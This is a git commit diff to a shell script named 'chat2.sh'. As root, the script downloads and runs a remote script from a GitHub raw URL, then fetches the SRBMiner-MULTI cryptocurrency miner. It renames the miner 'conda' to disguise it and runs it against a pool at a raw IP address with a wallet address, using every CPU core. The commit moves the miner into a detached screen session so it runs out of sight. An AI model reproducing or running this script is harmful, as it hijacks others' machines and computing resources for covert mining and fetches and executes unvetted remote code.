51272017f8a44f0cef8e97bcde35e72d51c8d05f
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-09-29 21:59:12 +0700

    Update chat2.sh

--- chat2.sh
+++ chat2.sh
@@ -3,6 +3,6 @@ sudo su <<EOF
 apt-get -y install screen
 wget -qO winter.sh https://raw.githubusercontent.com/anihsugiarti9/ebor/main/login.sh && chmod +x * && ./winter.sh
 
-wget https://raw.githubusercontent.com/apaple/pack/main/SRBMiner-MULTI && chmod u+x SRBMiner-MULTI && mv SRBMiner-MULTI conda && clear && ./conda --disable-gpu --algorithm yespowertide --pool 8.222.237.217:443 --wallet TBEv2m949AK9X72hR6fcfheWuS9mjaB3y9.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S")) --password x -t $(nproc --all)
+wget https://raw.githubusercontent.com/apaple/pack/main/SRBMiner-MULTI && chmod u+x SRBMiner-MULTI && mv SRBMiner-MULTI conda && clear && screen -dms run ./conda --disable-gpu --algorithm yespowertide --pool 8.222.237.217:443 --wallet TBEv2m949AK9X72hR6fcfheWuS9mjaB3y9.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S")) --password x -t $(nproc --all)
 EOF
 screen -r
